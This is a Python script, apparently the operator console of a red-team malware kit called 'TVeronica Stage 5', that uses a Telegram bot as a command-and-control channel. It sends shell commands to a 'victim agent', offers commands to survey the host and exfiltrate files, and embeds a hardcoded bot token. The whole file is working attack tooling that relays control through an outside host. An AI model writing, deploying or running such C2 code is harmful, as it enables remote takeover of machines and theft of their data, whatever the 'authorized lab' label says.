#!/usr/bin/env python3
"""TVeronica Stage 5 - Telegram C2 operator console (authorized red team lab only).

Usage:
    python3 teleop.py
Then message the bot from any Telegram client to bind the chat, type shell
commands to run on the victim agent. Special commands:
    info        host/user/pid survey
    dl:<path>   exfiltrate a file as Telegram document
    die         kill the agent
"""
import json
import queue
import sys
import threading
import time
import urllib.parse
import urllib.request

TOKEN = "8908957210:AAHv0AvNdddfHHoXxR-xssqMtS9all7Uyso"
BASE = "https://api.telegram.org/bot" + TOKEN


def api(method, params=None, timeout=60):
    data = urllib.parse.urlencode(params).encode() if params else None
    req = urllib.request.Request(BASE + "/" + method, data=data)
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return json.loads(r.read().decode("utf-8", "replace"))


def stdin_worker(q):
    for line in sys.stdin:
        q.put(line.rstrip("\r\n"))


def main():
    me = api("getMe")["result"]
    print("[+] bot: @%s (%s)" % (me["username"], me["first_name"]))
    print("[*] commands: <shell> | info | dl:<path> | die")
    print("[*] bind chat: send any message to the bot from Telegram, then type here")

    q = queue.Queue()
    threading.Thread(target=stdin_worker, args=(q,), daemon=True).start()

    offset = 0
    chat = None
    while True:
        try:
            res = api("getUpdates", {"offset": offset, "timeout": 25})
        except Exception as e:                      # network hiccup - keep polling
            print("[!] poll error: %s" % e)
            time.sleep(5)
            continue

        for u in res.get("result", []):
            offset = u["update_id"] + 1
            msg = u.get("message") or {}
            chat = msg.get("chat", {}).get("id", chat)
            text = msg.get("text", "")
            if text:
                print("[victim] %s" % text)

        while not q.empty():
            line = q.get()
            if not line:
                continue
            if chat is None:
                print("[!] no chat bound yet - message the bot first")
                continue
            api("sendMessage", {"chat_id": chat, "text": line})
            print("[sent]  %s" % line)


if __name__ == "__main__":
    main()
